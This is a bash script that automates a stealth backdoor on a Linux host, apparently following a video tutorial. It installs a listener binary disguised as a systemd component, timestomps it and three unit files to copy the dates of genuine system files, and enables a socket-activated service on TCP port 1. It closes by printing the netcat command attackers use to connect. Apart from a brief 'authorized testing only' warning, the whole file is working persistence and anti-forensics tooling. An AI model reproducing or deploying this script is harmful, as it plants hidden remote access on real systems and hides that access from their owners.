#!/bin/bash
#
# deploy-stealth-listener.sh
# Automates the stealth systemd socket-activated backdoor setup
# as shown in hacktheclown's video.
#
# WARNING: For authorized security testing only.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

LISTENER_BIN="/usr/lib/systemd/systemd-user-service"
SOCKET_PATH="/run/systemd/systemd.init.sock"
UNIT_DIR="/usr/lib/systemd/system"
SERVICE_FILE="${UNIT_DIR}/user.service"
SOCKET_FILE="${UNIT_DIR}/init.socket"
INIT_SERVICE="${UNIT_DIR}/init.service"
RELEASE_BIN="/home/hermespi/listener/target/release/systemd-user-service"

info()  { echo -e "${BLUE}[*]${NC} $*"; }
ok()    { echo -e "${GREEN}[✓]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[✗]${NC} $*"; exit 1; }

# --- Root check ---
if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo)."
fi

info "=== Stealth systemd Socket Backdoor Deployment ==="
info ""

# --- Step 1: Deploy the Rust listener ---
if [[ -f "$RELEASE_BIN" ]]; then
    cp "$RELEASE_BIN" "$LISTENER_BIN"
    ok "Deployed listener binary to $LISTENER_BIN"
else
    err "Rust binary not found at $RELEASE_BIN — run 'cargo build --release' first."
fi

# Make it look like it's been there for ages by copying timestamp from an old system file
if [[ -f /usr/lib/systemd/systemd ]]; then
    touch -r /usr/lib/systemd/systemd "$LISTENER_BIN" 2>/dev/null || true
    ok "Timestomped binary to match /usr/lib/systemd/systemd"
fi

# --- Step 2: Deploy the unit files ---
cp /home/hermespi/listener/user.service "$SERVICE_FILE"
cp /home/hermespi/listener/init.socket "$SOCKET_FILE"
cp /home/hermespi/listener/init.service "$INIT_SERVICE"

# Timestomp unit files to look like OS-generated ones
for f in "$SERVICE_FILE" "$SOCKET_FILE" "$INIT_SERVICE"; do
    touch -r /usr/lib/systemd/system/systemd-journald.service "$f" 2>/dev/null || true
done
ok "Deployed all 3 systemd unit files with timestomped dates"

# --- Step 3: Create the Unix socket directory ---
mkdir -p /run/systemd
ok "Ensured /run/systemd exists"

# --- Step 4: Reload systemd and start the socket ---
systemctl daemon-reload
ok "systemd daemon reloaded"

# Enable the Rust listener user service
systemctl enable user.service 2>/dev/null || true
ok "Enabled user.service (Rust listener)"

# Enable & start the socket (this auto-starts init.service on connection)
systemctl enable init.socket
systemctl start init.socket
ok "Enabled and started init.socket (TCP:1 → Unix socket)"

# Start the Rust listener service
systemctl start user.service
ok "Started user.service (Unix socket listener)"

# --- Step 5: Verification ---
echo ""
info "=== Verification ==="
echo ""

# Check the socket is listening on port 1
if ss -tlnp | grep -q ':1 '; then
    ok "TCP port 1 is listening (systemd-socket-proxyd)"
else
    warn "TCP port 1 not showing in ss — checking socket unit..."
    systemctl status init.socket --no-pager 2>&1 | head -10
fi

# Check the Unix domain socket exists
if [[ -S "$SOCKET_PATH" ]]; then
    ok "Unix domain socket exists at $SOCKET_PATH"
else
    warn "Unix socket not found — checking user.service status..."
    systemctl status user.service --no-pager 2>&1 | head -10
fi

# Show the running listener
if pgrep -f systemd-user-service >/dev/null 2>&1; then
    ok "Rust listener process is running"
else
    warn "Listener process not running — may start on first connection (socket activation)"
fi

echo ""
info "=== Deployment Complete ==="
echo ""
info "Attackers connect to: TCP port 1"
info "  nc <target-ip> 1"
info ""
info "Files deployed:"
info "  $LISTENER_BIN      (Rust Unix socket listener)"
info "  $SERVICE_FILE      (user.service — keeps listener alive)"
info "  $SOCKET_FILE       (init.socket — opens TCP:1)"
info "  $INIT_SERVICE      (init.service — proxies TCP→Unix socket)"
info ""
warn "This is for authorized security testing only."
